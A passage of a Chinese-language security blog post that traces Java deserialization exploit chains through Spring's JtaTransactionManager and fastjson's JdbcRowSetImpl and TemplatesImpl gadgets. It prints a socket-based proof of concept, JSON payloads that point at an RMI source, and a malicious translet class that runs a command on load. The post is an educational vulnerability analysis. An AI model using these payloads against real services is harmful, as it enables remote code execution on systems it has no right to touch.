+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">protected</span> <span class="keyword">void</span> <span class="title">initUserTransactionAndTransactionManager</span><span class="params">()</span> <span class="keyword">throws</span> TransactionSystemException </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (<span class="keyword">this</span>.userTransaction == <span class="keyword">null</span>) &#123;</span><br><span class="line">        <span class="keyword">if</span> (StringUtils.hasLength(<span class="keyword">this</span>.userTransactionName)) &#123;</span><br><span class="line">            <span class="keyword">this</span>.userTransaction = <span class="keyword">this</span>.lookupUserTransaction(<span class="keyword">this</span>.userTransactionName);</span><br><span class="line">            <span class="keyword">this</span>.userTransactionObtainedFromJndi = <span class="keyword">true</span>;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">this</span>.userTransaction = <span class="keyword">this</span>.retrieveUserTransaction();</span><br><span class="line">            <span class="keyword">if</span> (<span class="keyword">this</span>.userTransaction == <span class="keyword">null</span> &amp;&amp; <span class="keyword">this</span>.autodetectUserTransaction) &#123;</span><br><span class="line">                <span class="keyword">this</span>.userTransaction = <span class="keyword">this</span>.findUserTransaction();</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
+<p>继续进一步跟进<code>lookupUserTransaction()</code>函数</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">protected</span> UserTransaction <span class="title">lookupUserTransaction</span><span class="params">(String userTransactionName)</span> <span class="keyword">throws</span> TransactionSystemException </span>&#123;</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="keyword">this</span>.logger.isDebugEnabled()) &#123;</span><br><span class="line">            <span class="keyword">this</span>.logger.debug(<span class="string">"Retrieving JTA UserTransaction from JNDI location ["</span> + userTransactionName + <span class="string">"]"</span>);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> (UserTransaction)<span class="keyword">this</span>.getJndiTemplate().lookup(userTransactionName, UserTransaction.class);</span><br><span class="line">    &#125; <span class="keyword">catch</span> (NamingException var3) &#123;</span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> TransactionSystemException(<span class="string">"JTA UserTransaction is not available at JNDI location ["</span> + userTransactionName + <span class="string">"]"</span>, var3);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>可以看到最终<code>return (UserTransaction)this.getJndiTemplate().lookup(userTransactionName, UserTransaction.class)</code>,跟进<code>JndiTemplate</code>类的<code>lookup</code>方法,</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> Object <span class="title">lookup</span><span class="params">(<span class="keyword">final</span> String name)</span> <span class="keyword">throws</span> NamingException </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (<span class="keyword">this</span>.logger.isDebugEnabled()) &#123;</span><br><span class="line">        <span class="keyword">this</span>.logger.debug(<span class="string">"Looking up JNDI object with name ["</span> + name + <span class="string">"]"</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">this</span>.execute(<span class="keyword">new</span> JndiCallback&lt;Object&gt;() &#123;</span><br><span class="line">        <span class="function"><span class="keyword">public</span> Object <span class="title">doInContext</span><span class="params">(Context ctx)</span> <span class="keyword">throws</span> NamingException </span>&#123;</span><br><span class="line">            Object located = ctx.lookup(name);</span><br><span class="line">            <span class="keyword">if</span> (located == <span class="keyword">null</span>) &#123;</span><br><span class="line">                <span class="keyword">throw</span> <span class="keyword">new</span> NameNotFoundException(<span class="string">"JNDI object with ["</span> + name + <span class="string">"] not found: JNDI implementation returned null"</span>);</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                <span class="keyword">return</span> located;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>而<code>execute()</code>方法的定义如下</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> &lt;T&gt; <span class="function">T <span class="title">execute</span><span class="params">(JndiCallback&lt;T&gt; contextCallback)</span> <span class="keyword">throws</span> NamingException </span>&#123;</span><br><span class="line">        Context ctx = <span class="keyword">this</span>.getContext();</span><br><span class="line"></span><br><span class="line">        Object var3;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            var3 = contextCallback.doInContext(ctx);<span class="comment">//此处触发RCE</span></span><br><span class="line">        &#125; <span class="keyword">finally</span> &#123;</span><br><span class="line">            <span class="keyword">this</span>.releaseContext(ctx);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> var3;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
+<p>可以看到在整个流程的最后将会查询最开始我们由反序列化传入的<code>org.springframework.transaction.jta.JtaTransactionManager</code>类的对象的<code>userTransactionName</code>属性，最终导致加载了我们恶意的rmi源中的恶意类，从而导致RCE。</p>
+<h3 id="Poc"><a href="#Poc" class="headerlink" title="Poc"></a>Poc</h3><p>这个漏洞的Poc构造比起之前分析的apache common collections反序列化的Poc构造显然要简单许多：</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">System.out.println(<span class="string">"Connecting to server "</span>+serverAddress+<span class="string">":"</span>+port);</span><br><span class="line">Socket socket=<span class="keyword">new</span> Socket(serverAddress,port);</span><br><span class="line">System.out.println(<span class="string">"Connected to server"</span>);</span><br><span class="line">String jndiAddress = <span class="string">"rmi://127.0.0.1:1099/Object"</span>;<span class="comment">//恶意的rmi注册源</span></span><br><span class="line">			</span><br><span class="line">org.springframework.transaction.jta.JtaTransactionManager object = <span class="keyword">new</span> org.springframework.transaction.jta.JtaTransactionManager();</span><br><span class="line">object.setUserTransactionName(jndiAddress);</span><br><span class="line">			</span><br><span class="line">System.out.println(<span class="string">"Sending object to server..."</span>);</span><br><span class="line">ObjectOutputStream objectOutputStream = <span class="keyword">new</span> ObjectOutputStream(socket.getOutputStream());</span><br><span class="line">objectOutputStream.writeObject(object);</span><br><span class="line">objectOutputStream.flush();</span><br></pre></td></tr></table></figure>
+<p>可以看到已经弹出了计算器</p>
+<p><img src="https://ws3.sinaimg.cn/large/006tNc79ly1g02nr05wyuj317r0o1qem.jpg" alt="img"></p>
+<h2 id="fastjson反序列化漏洞"><a href="#fastjson反序列化漏洞" class="headerlink" title="fastjson反序列化漏洞"></a>fastjson反序列化漏洞</h2><p>与上面的利用链不同，之前我们介绍到的利用链都是由<code>readObject()</code>方法触发，而在fastjson的反序列化中我们触发漏洞则是利用了目标类的<code>setXXX()</code>方法和<code>getXXX()</code>方法，因为这两个方法是fastjson在完成反序列化时需要调用的方法。</p>
+<p>关于fastjson的反序列化我测试了两种不同的利用链，分别为<code>JdbcRowSetImpl</code>与<code>TemplatesImpl</code>.前者正如同之前测试的spring jndi反序列化漏洞，使用了JNDI这一java特性来实现RCE；而后者则使用了另一套不同的机制。这里给出两种利用链的分析。</p>
+<h2 id="JdbcRowSetImpl"><a href="#JdbcRowSetImpl" class="headerlink" title="JdbcRowSetImpl"></a>JdbcRowSetImpl</h2><p>利用JdbcRowSetImpl时使用的payload主要如下:</p>
+<figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">    <span class="attr">"@type"</span>:<span class="string">"com.sun.rowset.JdbcRowSetImpl"</span>,</span><br><span class="line">    <span class="attr">"dataSourceName"</span>:<span class="string">"rmi://127.0.0.1:3456/Object"</span>,</span><br><span class="line">    <span class="attr">"autoCommit"</span>:<span class="literal">true</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>在触发反序列化时会调用<code>JdbcRowSetImpl</code>类的 <code>setAutoCommit</code>函数</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">setAutoCommit</span><span class="params">(<span class="keyword">boolean</span> var1)</span> <span class="keyword">throws</span> SQLException </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="keyword">this</span>.conn != <span class="keyword">null</span>) &#123;</span><br><span class="line">            <span class="keyword">this</span>.conn.setAutoCommit(var1);</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">this</span>.conn = <span class="keyword">this</span>.connect();</span><br><span class="line">            <span class="keyword">this</span>.conn.setAutoCommit(var1);</span><br><span class="line">        &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>继续跟进<code>connect</code>函数</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">protected</span> Connection <span class="title">connect</span><span class="params">()</span> <span class="keyword">throws</span> SQLException </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="keyword">this</span>.conn != <span class="keyword">null</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">this</span>.conn;</span><br><span class="line">        &#125; <span class="keyword">else</span> <span class="keyword">if</span> (<span class="keyword">this</span>.getDataSourceName() != <span class="keyword">null</span>) &#123;</span><br><span class="line">            <span class="keyword">try</span> &#123;</span><br><span class="line">                InitialContext var1 = <span class="keyword">new</span> InitialContext();</span><br><span class="line">                DataSource var2 = (DataSource)var1.lookup(<span class="keyword">this</span>.getDataSourceName());</span><br><span class="line">                <span class="keyword">return</span> <span class="keyword">this</span>.getUsername() != <span class="keyword">null</span> &amp;&amp; !<span class="keyword">this</span>.getUsername().equals(<span class="string">""</span>) ? var2.getConnection(<span class="keyword">this</span>.getUsername(), <span class="keyword">this</span>.getPassword()) : var2.getConnection();</span><br><span class="line">            &#125; <span class="keyword">catch</span> (NamingException var3) &#123;</span><br><span class="line">                <span class="keyword">throw</span> <span class="keyword">new</span> SQLException(<span class="keyword">this</span>.resBundle.handleGetObject(<span class="string">"jdbcrowsetimpl.connect"</span>).toString());</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">this</span>.getUrl() != <span class="keyword">null</span> ? DriverManager.getConnection(<span class="keyword">this</span>.getUrl(), <span class="keyword">this</span>.getUsername(), <span class="keyword">this</span>.getPassword()) : <span class="keyword">null</span>;</span><br><span class="line">        &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>可以看到当conn为null时会发起JNDI查询从而加载我们的恶意类,这条利用链也是很简单的一条利用链，其缺陷也很明显，在jdk版本1.8时无法直接使用。</p>
+<h2 id="TemplatesImpl"><a href="#TemplatesImpl" class="headerlink" title="TemplatesImpl"></a>TemplatesImpl</h2><p>payload如下:</p>
+<figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">&#123;    <span class="attr">"@type"</span>:<span class="string">"com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl"</span>,</span><br><span class="line">    <span class="attr">"_bytecodes"</span>:[<span class="string">"base64编码后的继承于AbstractTranslet类的子类的class文件"</span>],</span><br><span class="line">    '_name':'a.b',</span><br><span class="line">    '_tfactory':&#123; &#125;,</span><br><span class="line">    "_outputProperties":&#123; &#125;,</span><br><span class="line">    "_version":"1.0",</span><br><span class="line">    "allowedProtocols":"all"</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>由于<code>com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl</code>类的<code>outputProperties</code>属性类型为<code>Properties</code>因此在反序列化过程中会调用该类的<code>getOutputProperties</code>方法。</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">synchronized</span> Properties <span class="title">getOutputProperties</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> newTransformer().getOutputProperties();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">catch</span> (TransformerConfigurationException e) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">null</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>继续跟进<code>newTransformer</code>方法</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">synchronized</span> Transformer <span class="title">newTransformer</span><span class="params">()</span></span></span><br><span class="line"><span class="function">        <span class="keyword">throws</span> TransformerConfigurationException</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        TransformerImpl transformer;</span><br><span class="line"></span><br><span class="line">        transformer = <span class="keyword">new</span> TransformerImpl(getTransletInstance(), _outputProperties,</span><br><span class="line">            _indentNumber, _tfactory);<span class="comment">//this line</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (_uriResolver != <span class="keyword">null</span>) &#123;</span><br><span class="line">            transformer.setURIResolver(_uriResolver);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (_tfactory.getFeature(XMLConstants.FEATURE_SECURE_PROCESSING)) &#123;</span><br><span class="line">            transformer.setSecureProcessing(<span class="keyword">true</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> transformer;</span><br><span class="line">	&#125;</span><br></pre></td></tr></table></figure>
+<p>在<code>newTransformer</code>方法中需要实例化一个TransformerImpl类的对象，跟进<code>getTransletInstance()</code>方法</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">private</span> Translet <span class="title">getTransletInstance</span><span class="params">()</span></span></span><br><span class="line"><span class="function">        <span class="keyword">throws</span> TransformerConfigurationException </span>&#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="keyword">if</span> (_name == <span class="keyword">null</span>) <span class="keyword">return</span> <span class="keyword">null</span>;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> (_class == <span class="keyword">null</span>) defineTransletClasses();</span><br><span class="line"></span><br><span class="line">            <span class="comment">// The translet needs to keep a reference to all its auxiliary</span></span><br><span class="line">            <span class="comment">// class to prevent the GC from collecting them</span></span><br><span class="line">            AbstractTranslet translet = (AbstractTranslet) _class[_transletIndex].newInstance();</span><br><span class="line">            translet.postInitialization();</span><br><span class="line">            translet.setTemplates(<span class="keyword">this</span>);</span><br><span class="line">            translet.setServicesMechnism(_useServicesMechanism);</span><br><span class="line">            translet.setAllowedProtocols(_accessExternalStylesheet);</span><br><span class="line">            <span class="keyword">if</span> (_auxClasses != <span class="keyword">null</span>) &#123;</span><br><span class="line">                translet.setAuxiliaryClasses(_auxClasses);</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">return</span> translet;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">catch</span> (InstantiationException e) &#123;</span><br><span class="line">            ErrorMsg err = <span class="keyword">new</span> ErrorMsg(ErrorMsg.TRANSLET_OBJECT_ERR, _name);</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> TransformerConfigurationException(err.toString());</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">catch</span> (IllegalAccessException e) &#123;</span><br><span class="line">            ErrorMsg err = <span class="keyword">new</span> ErrorMsg(ErrorMsg.TRANSLET_OBJECT_ERR, _name);</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> TransformerConfigurationException(err.toString());</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
+<p>跟进<code>defineTransletClasses</code>方法中</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title">defineTransletClasses</span><span class="params">()</span></span></span><br><span class="line"><span class="function">        <span class="keyword">throws</span> TransformerConfigurationException </span>&#123;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (_bytecodes == <span class="keyword">null</span>) &#123;</span><br><span class="line">            <span class="comment">//...</span></span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        TransletClassLoader loader = (TransletClassLoader)</span><br><span class="line">            AccessController.doPrivileged(<span class="keyword">new</span> PrivilegedAction() &#123;</span><br><span class="line">                <span class="function"><span class="keyword">public</span> Object <span class="title">run</span><span class="params">()</span> </span>&#123;</span><br><span class="line">                    <span class="keyword">return</span> <span class="keyword">new</span> TransletClassLoader(ObjectFactory.findClassLoader(),_tfactory.getExternalExtensionsMap());</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="keyword">final</span> <span class="keyword">int</span> classCount = _bytecodes.length;</span><br><span class="line">            _class = <span class="keyword">new</span> Class[classCount];</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> (classCount &gt; <span class="number">1</span>) &#123;</span><br><span class="line">                _auxClasses = <span class="keyword">new</span> Hashtable();</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; classCount; i++) &#123;</span><br><span class="line">                _class[i] = loader.defineClass(_bytecodes[i]);</span><br><span class="line">                <span class="keyword">final</span> Class superClass = _class[i].getSuperclass();</span><br><span class="line"></span><br><span class="line">                <span class="comment">// Check if this is the main class</span></span><br><span class="line">                <span class="keyword">if</span> (superClass.getName().equals(ABSTRACT_TRANSLET)) &#123;</span><br><span class="line">                    _transletIndex = i;</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="keyword">else</span> &#123;</span><br><span class="line">                    _auxClasses.put(_class[i].getName(), _class[i]);</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> (_transletIndex &lt; <span class="number">0</span>) &#123;</span><br><span class="line">                ErrorMsg err= <span class="keyword">new</span> ErrorMsg(ErrorMsg.NO_MAIN_TRANSLET_ERR, _name);</span><br><span class="line">                <span class="keyword">throw</span> <span class="keyword">new</span> TransformerConfigurationException(err.toString());</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">catch</span> (ClassFormatError e) &#123;</span><br><span class="line">            ErrorMsg err = <span class="keyword">new</span> ErrorMsg(ErrorMsg.TRANSLET_CLASS_ERR, _name);</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> TransformerConfigurationException(err.toString());</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">catch</span> (LinkageError e) &#123;</span><br><span class="line">            ErrorMsg err = <span class="keyword">new</span> ErrorMsg(ErrorMsg.TRANSLET_OBJECT_ERR, _name);</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> TransformerConfigurationException(err.toString());</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
+<p>可以看到该方法将会遍历我们传入的<code>_bytecodes</code>数组，执行<code>loader.defineClass</code>方法，而<code>TransletClassLoader</code>类的defineClass方法如下:</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">Class <span class="title">defineClass</span><span class="params">(<span class="keyword">final</span> <span class="keyword">byte</span>[] b)</span> </span>&#123;</span><br><span class="line">            <span class="keyword">return</span> defineClass(<span class="keyword">null</span>, b, <span class="number">0</span>, b.length);</span><br><span class="line">        &#125;</span><br></pre></td></tr></table></figure>
+<p>可见直接实现于<code>ClassLoader</code>类的<code>defineClass</code>方法。查询jdk1.8的文档</p>
+<p><img src="https://ws2.sinaimg.cn/large/006tKfTcly1g0609qk6oij30ja06u0tv.jpg" alt="https://ws2.sinaimg.cn/large/006tKfTcly1g0609qk6oij30ja06u0tv.jpg"></p>
+<p>可以看到该方法会将我们传入的编码后的class文件加载入jvm。</p>
+<p>而我们的恶意类继承于<code>ABSTRACT_TRANSLET</code>，即<code>com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet</code>，因此便会设置<code>_transletIndex</code>为0。再回到我们的<code>getTransletInstance</code>方法中，</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">AbstractTranslet translet = (AbstractTranslet) _class[_transletIndex].newInstance();</span><br></pre></td></tr></table></figure>
+<p>生成了一个我们的恶意类的对象实例，因此导致了我们的恶意类中的代码最后被执行。</p>
+<p>这里我们使用的恶意类如下:</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> JavaUnser;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.DOM;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.TransletException;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xml.internal.dtm.DTMAxisIterator;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xml.internal.serializer.SerializationHandler;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">ShellExec</span> <span class="keyword">extends</span> <span class="title">AbstractTranslet</span></span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">ShellExec</span><span class="params">()</span> <span class="keyword">throws</span> IOException</span>&#123;</span><br><span class="line">        Runtime.getRuntime().exec(<span class="string">"/Applications/Calculator.app/Contents/MacOS/Calculator"</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">transform</span><span class="params">(DOM document, DTMAxisIterator iterator, SerializationHandler handler)</span> </span>&#123;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">transform</span><span class="params">(DOM document, com.sun.org.apache.xml.internal.serializer.SerializationHandler[] handlers)</span> <span class="keyword">throws</span> TransletException </span>&#123;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">        <span class="comment">//ShellExec t = new ShellExec();</span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>当fastjson反序列化执行我们的payload时便可以触发构造方法中的操作从而导致RCE。</p>
+<h2 id="后记"><a href="#后记" class="headerlink" title="后记"></a>后记</h2><p>这里分析的几条反序列化的利用链属于分析难度不算特别大的反序列化利用链，便于我们入门java反序列化漏洞。相关的测试代码已经放到了<a href="https://github.com/imagemlt/JavaUnserializePocs" target="_blank" rel="noopener">github</a>上,大家可以clone该项目下断点测试.另外最近在jdk1.8下对于JNDI限制的绕过后来阅读了一些大佬的博客(<a href="https://bl4ck.in/tricks/2019/01/04/JNDI-Injection-Bypass.html)，存在绕过限制的方法，大家也可以去测试一下。" target="_blank" rel="noopener">https://bl4ck.in/tricks/2019/01/04/JNDI-Injection-Bypass.html)，存在绕过限制的方法，大家也可以去测试一下。</a></p>
+<h2 id="参考文章"><a href="#参考文章" class="headerlink" title="参考文章"></a>参考文章</h2><ul>
+<li><p><a href="https://www.freebuf.com/vuls/175252.html" target="_blank" rel="noopener">https://www.freebuf.com/vuls/175252.html</a></p>
+</li>
+<li><p><a href="https://github.com/frohoff/ysoserial" target="_blank" rel="noopener">https://github.com/frohoff/ysoserial</a></p>
+</li>
+<li><p><a href="http://pirogue.org/2017/12/22/javaSerialKiller/" target="_blank" rel="noopener">http://pirogue.org/2017/12/22/javaSerialKiller/</a></p>
+</li>
